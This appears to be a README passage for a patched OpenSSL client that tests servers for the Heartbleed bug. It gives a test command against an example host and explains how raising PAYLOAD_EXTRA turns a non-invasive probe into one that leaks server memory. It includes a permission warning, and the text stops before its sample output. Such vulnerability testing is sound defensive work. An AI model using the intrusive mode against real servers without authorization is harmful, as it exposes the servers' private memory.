Patch OpenSSL and compile. The resulting openssl binary will be in the
apps/ subdirectory. It's best that you rename it (e.g., to
openssl-heartbleed) and copy somewhere else.

With PAYLOAD_EXTRA set to 16 (the default), the test is non-invasive and
won't return any server data. If you want to use an instrusive test (which
is necessary to differentiate vulnerable OpenSSL from non-vulnerable GnuTLS),
increase the value.

 | NOTE Use only on systems that you are allowed to test. Under
 |      no circumstances test systems for which you have no permission.

To test, invoke the patched version of OpenSSL, type B and press RETURN:

    $ ./openssl-heartbleed s_client -connect www.example.com:443 -msg

A server that doesn't respond isn't vulnerable. A server that returns
more data than it receives is vulnerable.

This is an example of a server returning 16 bytes of server data
(equivalent of setting PAYLOAD_EXTRA to 32):
